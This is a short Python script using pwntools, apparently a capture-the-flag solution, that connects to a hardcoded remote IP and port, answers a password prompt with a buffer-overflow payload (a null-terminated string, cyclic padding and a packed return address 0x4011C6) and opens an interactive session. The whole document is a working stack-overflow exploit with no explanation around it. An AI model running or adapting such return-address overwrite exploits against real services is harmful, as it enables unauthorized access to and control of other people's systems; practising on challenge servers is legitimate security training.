from pwn import *


io = remote("45.76.91.112", 10052)

io.recvuntil(b"Enter password:")

message = flat(
    b'aaaaaaaa\x00',
    cyclic(31),
    p64(0x4011C6)
)
io.sendline(message)

io.interactive()
